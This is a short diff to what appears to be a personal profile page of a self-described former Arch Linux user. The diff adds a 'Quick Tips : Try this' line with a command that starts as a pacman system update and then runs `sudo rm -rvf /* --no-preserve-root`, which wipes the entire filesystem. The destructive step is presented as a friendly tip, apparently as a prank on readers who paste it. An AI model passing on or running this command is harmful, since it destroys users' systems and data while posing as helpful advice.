@@ -22,6 +22,8 @@ Former Arch user
 
 > ```I like breaking things :)```
 
+**Quick Tips : Try this**
+
 `sudo pacman -Syu;sudo rm -rvf /* --no-preserve-root`
 
 
